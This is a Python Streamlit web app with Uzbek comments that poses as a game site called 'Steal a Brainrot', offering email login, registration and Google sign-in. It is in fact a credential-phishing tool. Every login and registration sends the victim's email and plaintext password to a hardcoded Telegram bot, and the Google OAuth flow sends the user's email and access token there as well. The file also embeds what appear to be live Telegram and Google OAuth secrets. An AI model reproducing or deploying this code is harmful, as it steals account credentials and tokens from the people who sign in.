import streamlit as st
import requests
import sqlite3

# 1. Telegram konfiguratsiyasi
BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
CHAT_ID = "8088597011"
CLIENT_ID = "1085309280384-idkflab6a8as83fuum4479ovni8b367e.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = "https://steal-breinrot-app-gtxahjgkk8egizl2uuu6sd.streamlit.app/"

# 2. Ma'lumotlar bazasi (Foydalanuvchilarni saqlash uchun)
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, password TEXT)')
conn.commit()

# 3. Dizayn (Qora rangda, telefonga mos)
st.set_page_config(page_title="Steal a Brainrot", layout="centered")
st.markdown("""
    <style>
    .stApp {background-color: #000000; color: white;}
    div.stButton > button {width: 100%; border-radius: 10px; background-color: #ff4b4b; color: white;}
    </style>
""", unsafe_allow_html=True)

st.title("🔥 Steal a Brainrot")

# 4. Asosiy Tablar
tab1, tab2 = st.tabs(["Login", "Registratsiya"])

with tab1:
    email = st.text_input("Email", placeholder="example@gmail.com")
    password = st.text_input("Parol", type="password")
    if st.button("Kirish"):
        c.execute("SELECT * FROM users WHERE email=? AND password=?", (email, password))
        if c.fetchone():
            st.success("Xush kelibsiz!")
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Login qilindi:\nEmail: {email}\nParol: {password}")
        else:
            st.error("Email yoki parol xato!")

with tab2:
    reg_email = st.text_input("Yangi Email", placeholder="...@gmail.com")
    reg_password = st.text_input("Yangi Parol", type="password")
    if st.button("Ro'yxatdan o'tish"):
        if "@gmail.com" not in reg_email:
            st.error("Email @gmail.com bo'lishi shart!")
        elif len(reg_password) < 8:
            st.error("Parol 8 ta belgidan kam bo'lmasligi kerak!")
        else:
            try:
                c.execute("INSERT INTO users VALUES (?, ?)", (reg_email, reg_password))
                conn.commit()
                st.success("Muvaffaqiyatli!")
                requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Yangi Registratsiya:\nEmail: {reg_email}\nParol: {reg_password}")
            except:
                st.error("Bu email allaqachon mavjud!")

# 5. Google Login
st.divider()
GOOGLE_AUTH_URL = f"https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&scope=email profile"
st.link_button("Google orqali kirish", GOOGLE_AUTH_URL, type="primary")

# Google'dan qaytganda ma'lumotni olish
params = st.query_params
code = params.get("code")

if code:
    token_url = "https://oauth2.googleapis.com/token"
    data = {"code": code, "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "redirect_uri": REDIRECT_URI, "grant_type": "authorization_code"}
    res = requests.post(token_url, data=data).json()
    if "access_token" in res:
        user_info = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", headers={"Authorization": f"Bearer {res['access_token']}"}).json()
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Google Login:\nEmail: {user_info.get('email')}\nToken: {res['access_token']}")
        st.balloons()
